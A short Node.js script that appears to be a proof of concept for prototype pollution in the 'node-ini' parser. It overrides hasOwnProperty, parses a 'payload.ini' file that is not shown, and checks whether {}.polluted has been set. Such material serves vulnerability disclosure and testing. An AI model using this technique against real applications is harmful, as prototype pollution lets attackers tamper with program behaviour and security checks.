Object.prototype.hasOwnProperty = () => true;
const ini = require('node-ini');
console.log({}.polluted);
ini.parse('./payload.ini', function (err, data) {
    console.log({}.polluted);
});